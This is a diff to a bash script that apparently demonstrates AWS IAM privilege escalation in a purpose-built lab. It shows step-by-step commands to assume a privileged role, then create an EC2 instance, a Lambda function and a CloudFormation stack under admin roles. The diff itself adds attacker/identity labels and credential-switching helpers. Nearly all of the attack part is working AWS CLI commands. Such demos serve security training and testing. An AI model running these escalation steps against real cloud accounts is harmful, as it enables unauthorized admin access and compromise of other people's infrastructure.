@@ -20,12 +20,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -63,20 +65,41 @@ STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secre
 PRIVESC_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_role_arn')
 STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
 
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo -e "${GREEN}✅ Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
 echo "📋 Privesc Role ARN: $PRIVESC_ROLE_ARN"
 
-# Set environment variables for starting user
-export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
-export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+cd - > /dev/null
+
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 export AWS_DEFAULT_REGION="us-west-2"
 
+# [EXPLOIT] Step 1: Assume the role with multiple privilege escalation paths
 echo ""
 echo -e "${YELLOW}Step 1: Assuming the role with multiple privilege escalation paths${NC}"
 echo "Role ARN: $PRIVESC_ROLE_ARN"
 
+use_starting_creds
 # Assume the role
-show_attack_cmd aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
@@ -84,15 +107,17 @@ export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.Sess
 
 echo -e "${GREEN}✓ Successfully assumed role${NC}"
 
+# [OBSERVATION] Step 3: Check current permissions
 echo ""
 echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
 # Check what we can do currently
 echo "Current caller identity:"
-show_cmd aws sts get-caller-identity
+show_cmd "Attacker" "aws sts get-caller-identity"
 aws sts get-caller-identity
 
 echo ""
 echo -e "${BLUE}=== EC2 Privilege Escalation Path ===${NC}"
+# [EXPLOIT] Step 4: Create EC2 instance with admin role
 echo -e "${YELLOW}Step 4: Creating EC2 instance with admin role${NC}"
 
 # Get the EC2 admin role ARN (construct it since we can't use GetRole)
@@ -138,7 +163,7 @@ else
 fi
 
 # Create EC2 instance
-show_attack_cmd aws ec2 run-instances --region us-west-2 --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name="pl-EC2Admin" --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'
+show_attack_cmd "Attacker" "aws ec2 run-instances --region us-west-2 --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name="pl-EC2Admin" --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'"
 aws ec2 run-instances --region us-west-2 \
     --image-id $AMI_ID \
     --instance-type t3.micro \
@@ -150,6 +175,7 @@ echo -e "${GREEN}✓ EC2 instance created with admin role${NC}"
 
 echo ""
 echo -e "${BLUE}=== Lambda Privilege Escalation Path ===${NC}"
+# [EXPLOIT] Step 5: Create Lambda function with admin role
 echo -e "${YELLOW}Step 5: Creating Lambda function with admin role${NC}"
 
 # Get the Lambda admin role ARN (construct directly since we don't have iam:GetRole permission)
@@ -206,7 +232,7 @@ zip lambda_function.zip lambda_function.py
 cd - > /dev/null
 
 # Create Lambda function
-show_attack_cmd aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region us-west-2
+show_attack_cmd "Attacker" "aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region us-west-2"
 aws lambda create-function \
     --function-name privesc-demo-lambda \
     --runtime python3.9 \
@@ -222,7 +248,7 @@ if ! aws lambda wait function-active --function-name privesc-demo-lambda --regio
 fi
 
 # Invoke the Lambda function
-show_attack_cmd aws lambda invoke --function-name privesc-demo-lambda --region us-west-2 /tmp/lambda-response.json
+show_attack_cmd "Attacker" "aws lambda invoke --function-name privesc-demo-lambda --region us-west-2 /tmp/lambda-response.json"
 aws lambda invoke \
     --function-name privesc-demo-lambda \
     --region us-west-2 \
@@ -232,6 +258,7 @@ echo -e "${GREEN}✓ Lambda function created and executed with admin role${NC}"
 
 echo ""
 echo -e "${BLUE}=== CloudFormation Privilege Escalation Path ===${NC}"
+# [EXPLOIT] Step 6: Create CloudFormation stack with admin role
 echo -e "${YELLOW}Step 6: Creating CloudFormation stack with admin role${NC}"
 
 # Get the CloudFormation admin role ARN (construct directly since we don't have iam:GetRole permission)
@@ -264,7 +291,7 @@ Outputs:
 EOF
 
 # Create CloudFormation stack
-show_attack_cmd aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region us-west-2
+show_attack_cmd "Attacker" "aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region us-west-2"
 aws cloudformation create-stack \
     --stack-name privesc-demo-cf-stack \
     --template-body file:///tmp/cf-template.yaml \
@@ -280,6 +307,8 @@ fi
 
 echo -e "${GREEN}✓ CloudFormation stack created with admin role${NC}"
 
+
+# [OBSERVATION] Step 7: Verify privilege escalation
 echo ""
 echo -e "${YELLOW}Step 7: Verifying privilege escalation${NC}"
 echo "Waiting for all resources to be ready..."
@@ -309,6 +338,7 @@ echo "Checking for created admin roles..."
 
 echo ""
 echo -e "${BLUE}=== Testing Role Assumption ===${NC}"
+# [OBSERVATION] Step 8: Test admin role access
 echo -e "${YELLOW}Step 8: Testing admin role access${NC}"
 
 # Test EC2 admin role
